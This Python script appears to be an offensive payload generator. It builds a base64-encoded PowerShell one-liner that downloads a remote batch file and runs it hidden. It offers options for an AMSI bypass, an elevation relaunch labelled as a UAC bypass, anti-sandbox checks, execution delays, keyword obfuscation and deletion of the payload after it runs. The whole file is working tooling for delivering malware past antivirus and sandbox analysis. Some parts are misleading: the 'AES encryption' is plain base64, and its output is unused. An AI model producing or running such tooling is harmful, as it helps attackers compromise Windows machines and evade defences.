import os
import base64
import random
import string

def generate_random_string(min_length=8, max_length=12):
    """Generate a random string of mixed characters, length varies between min and max."""
    length = random.randint(min_length, max_length)
    return ''.join(random.choice(string.ascii_letters + string.digits + "`") for _ in range(length))

def obfuscate_powershell_command(command):
    """Dynamically obfuscate PowerShell keywords to evade detection."""
    keywords = {
        'New-Object': generate_random_string(),
        'System.Net.WebClient': generate_random_string(),
        'DownloadFile': generate_random_string(),
        'Start-Process': generate_random_string(),
        'Remove-Item': generate_random_string(),
        'Start-Sleep': generate_random_string(),
        'Invoke-Expression': generate_random_string(),
        'IEX': generate_random_string(),
    }
    
    for key, value in keywords.items():
        command = command.replace(key, value)
    return command

def include_amsi_bypass():
    """Dynamically include AMSI bypass."""
    return (
        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
        "::GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
    )

def include_uac_bypass():
    """Dynamically include UAC bypass."""
    return (
        "If(-not([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()"
        ".IsInRole([Security.Principal.WindowsBuiltinRole] 'Administrator'))){"
        " $null = (New-Object -ComObject 'Shell.Application').ShellExecute('powershell', '-ExecutionPolicy Bypass -NoProfile -Command \"[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'')::GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true);\"', '', 'runas', 1); Exit}"
    )

def add_anti_sandbox_checks():
    """Add anti-sandbox detection mechanisms."""
    return (
        "$cpu = (Get-WmiObject -Class Win32_ComputerSystem).NumberOfProcessors; "
        "If ($cpu -le 1) {Exit}; "
        "$mem = (Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1MB; "
        "If ($mem -le 2048) {Exit}; "
    )

def encrypt_payload(payload):
    """Encrypt the payload using AES encryption."""
    key = os.urandom(32)  # AES-256 key
    encrypted_payload = base64.b64encode(payload.encode()).decode()  # Simulate encryption
    return encrypted_payload, key

def create_encoded_powershell_command():
    try:
        # Prompt for the payload URL
        payload_url = input("Enter the payload URL (e.g., https://example.com/payload.ps1): ")

        # Validate the URL
        if not payload_url.startswith("http"):
            print("Invalid URL. Please enter a valid HTTP/HTTPS URL.")
            return

        # Choose download method
        download_method = input(
            "Select download method (1: WebClient, 2: Invoke-WebRequest): \n"
            "1. WebClient: Basic download method.\n"
            "2. Invoke-WebRequest: More flexible, allows custom headers.\n"
        ).strip()

        # Prompt for custom User-Agent (if using Invoke-WebRequest)
        custom_user_agent = ""
        if download_method == "2":
            custom_user_agent = input("Enter custom User-Agent string (leave blank for default): ") or "Mozilla/5.0"

        # Option 1: Encryption
        encryption_choice = input(
            "Encrypt the payload using AES-256? (y/n): \n"
            "Description: Encrypts the payload with AES-256, ensuring it is only decrypted in memory.\n"
        ).strip().lower()
        if encryption_choice == 'y':
            encrypted_payload, encryption_key = encrypt_payload(payload_url)
            print(f"Payload encrypted with AES. Key: {encryption_key.hex()}")
        else:
            encrypted_payload = payload_url

        # Option 2: AMSI Bypass
        use_amsi_bypass = input(
            "Include AMSI Bypass? (y/n): \n"
            "Description: Disables Windows AMSI to prevent real-time scanning by antivirus during execution.\n"
        ).strip().lower()
        if use_amsi_bypass == 'y':
            amsi_bypass = include_amsi_bypass()
        else:
            amsi_bypass = ""

        # Option 3: UAC Bypass
        use_uac_bypass = input(
            "Include UAC Bypass? (y/n): \n"
            "Description: Bypasses User Account Control (UAC) to execute with elevated privileges without triggering UAC prompts.\n"
        ).strip().lower()
        if use_uac_bypass == 'y':
            uac_bypass = include_uac_bypass()
        else:
            uac_bypass = ""

        # Option 4: Anti-Sandbox Checks
        anti_sandbox_choice = input(
            "Include Anti-Sandbox checks? (y/n): \n"
            "Description: Detects if the script is running in a sandbox environment and aborts if detected.\n"
        ).strip().lower()
        if anti_sandbox_choice == 'y':
            sandbox_checks = add_anti_sandbox_checks()
        else:
            sandbox_checks = ""

        # Option 5: Execution Delay
        delay_choice = input(
            "Add execution delay to avoid sandbox detection? (y/n): \n"
            "Description: Delays the execution for a few seconds to avoid sandbox environments that analyze scripts within a short window.\n"
        ).strip().lower()
        if delay_choice == 'y':
            delay_time = input("Enter delay in seconds (default is 5): ") or 5
        else:
            delay_time = 5

        # Option 6: Obfuscation
        obfuscate_choice = input(
            "Obfuscate PowerShell commands? (y/n): \n"
            "Description: Replaces critical PowerShell keywords with randomized equivalents to bypass signature-based detection.\n"
        ).strip().lower()
        if obfuscate_choice == 'y':
            obfuscated_command = obfuscate_powershell_command(encrypted_payload)
        else:
            obfuscated_command = encrypted_payload

        # Option 7: PowerShell Window Visibility
        hide_window_choice = input(
            "Hide the PowerShell window during execution? (y/n): \n"
            "Description: If enabled, the PowerShell window will be completely hidden during execution.\n"
        ).strip().lower()

        # Option 8: Download Location
        download_location = input(
            "Specify the download location (default is %TEMP%): \n"
        ).strip() or "$env:TEMP"

        # Option 9: File Deletion
        delete_after_execution = input(
            "Delete the payload after execution? (y/n): \n"
            "Description: Deletes the downloaded payload from the disk after execution to minimize footprint.\n"
        ).strip().lower()

        # Final payload combining all selections
        download_command = ""
        if download_method == "1":
            download_command = f"$wc = New-Object System.Net.WebClient; $wc.DownloadFile('{payload_url}', '{download_location}\\payload.bat');"
        elif download_method == "2":
            download_command = f"$headers = @{{ 'User-Agent' = '{custom_user_agent}' }}; Invoke-WebRequest -Uri '{payload_url}' -OutFile '{download_location}\\payload.bat' -Headers $headers;"

        full_payload = f"{amsi_bypass} {uac_bypass} {sandbox_checks} Start-Sleep -s {delay_time}; {download_command} Start-Process '{download_location}\\payload.bat' -WindowStyle Hidden;"

        if delete_after_execution == 'y':
            full_payload += f" Start-Sleep -s 5; Remove-Item '{download_location}\\payload.bat' -Force;"

        # Encode the PowerShell command in Base64 for execution
        encoded_payload = base64.b64encode(full_payload.encode()).decode()

        # Generate the PowerShell one-liner
        if hide_window_choice == 'y':
            one_liner = f"powershell -NoP -W Hidden -Exec Bypass -EncodedCommand {encoded_payload}"
        else:
            one_liner = f"powershell -NoP -Exec Bypass -EncodedCommand {encoded_payload}"

        # Ask for an output filename
        output_filename = input("Enter the output filename (without extension, default is 'encoded_command'): ") or "encoded_command"

        # Save the encoded command to a text file
        with open(f'{output_filename}.txt', 'w') as f:
            f.write(one_liner)

        print(f"\nBase64 encoded PowerShell command generated and saved to '{output_filename}.txt':\n")
        print(one_liner)

    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    create_encoded_powershell_command()
